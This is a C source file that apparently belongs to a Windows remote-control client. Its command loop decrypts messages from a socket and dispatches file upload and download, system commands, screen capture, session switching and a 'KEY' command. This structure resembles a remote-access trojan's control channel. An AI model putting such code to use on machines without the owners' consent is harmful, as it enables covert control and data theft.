#include <WinSock2.h>
#include <stdio.h>
#pragma comment(lib,"./RemoteControlAssistance.lib")

#include "DATA.h"
#include "cmdTypeFn.h"
#include "rca.h"

void GetCommand(SOCKET ConnectSocket)
{
	while (true)
	{
		MESSAGEINFO message = {};
		if (g_ClientSock == 0) {
			g_ClientSock = ConnectSocket;
		}
		int recFlag = recv(g_ClientSock, (char*)&message,			//  pair 1 msg transferring
			sizeof(MESSAGEINFO), NULL);
		if (message.type != 0 && message.size != 0) {
			AESDecrpty((PCUCHAR)&message, sizeof(MESSAGEINFO), (PUCHAR)&message);
		}
		if (recFlag == 0 || recFlag == -1) {
			printf("disconnected");
			closesocket(g_ClientSock);
			WSACleanup();
			exit(0);
		}
		
		switch (message.type)
		{
		case OTHER:
			
			break;
		case UPLOAD:
			UploadFile(g_ClientSock, &message);
			break;
		case DOWNLOAD:
			DownloadFile(g_ClientSock, message.arg);
			break;
		case SYS:			//done // can QUIT to the menu with capital letter , also you can close the window with QUIT.
			SystemCmd();	
			break;
		case SCREEN:		// testing
			Screen(&message);
			break;
		case CHANGE:
			ChangeSession(&message);
			break;
		case KEY:
			KeyCmd();
			break;
		case QUIT:
			WSACleanup();
			exit(0);
			break;
		default:
			break;
		}

	}
}